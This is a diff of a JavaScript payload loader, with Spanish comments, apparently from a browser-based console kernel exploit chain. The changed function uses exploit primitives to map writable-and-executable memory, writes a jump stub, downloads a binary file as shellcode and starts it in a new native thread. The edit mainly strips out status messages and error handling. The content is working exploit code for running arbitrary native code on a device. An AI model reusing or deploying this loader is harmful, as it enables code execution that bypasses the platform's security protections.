@@ -1852,45 +1852,49 @@ function allset() {
     }
 }
 
-function PayloadLoader(Pfile) {
-    document.getElementById("msgs").innerHTML = "Cargando: " + Pfile + "...";
-    
-    var loader_addr = chain.sysp('mmap', new Int(0, 0), 0x1000, 7, 0x41000, -1, 0);
-    var tmpStubArray = array_from_address(loader_addr, 1);
-    tmpStubArray[0] = 0x00C3E7FF;
+function PayloadLoader(Pfile)
+{
+    var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
+  -1,
+  0
+);
 
-    var req = new XMLHttpRequest();
-    req.responseType = "arraybuffer";
-    req.open('GET', Pfile, true);
-    
-    req.onerror = function() {
-        alert("ERROR: No se encontró " + Pfile + " en el servidor.");
-    };
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
 
-    req.onreadystatechange = function () {
-        if (req.readyState == 4) {
-            if (req.status == 200) {
-                var PLD = req.response;
-                var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
-                var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
-                var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
-                var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
-                tmp.set(new Uint8Array(req.response), 0);
-                tmp.set(padding, req.response.byteLength);
-                var shellcode = new Uint32Array(tmp.buffer);
-                pl.set(shellcode, 0);
-                var pthread = malloc(0x10);
-                
-                call_nze('pthread_create', pthread, 0, loader_addr, payload_buffer);
-                
-                // Disparamos las notificaciones (Nativa + Red)
-                allset();
-            } else {
-                document.getElementById("msgs").innerHTML = "Error " + req.status + " al cargar " + Pfile;
-            }
-        }
-    };
-    req.send();
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET',Pfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        loader_addr,
+        payload_buffer,
+    );	
+   }
+ };
+
+
 }
 
 // --- 2. FLUJO DE EJECUCIÓN (KEXPLOIT + CARGA AUTOMÁTICA) ---
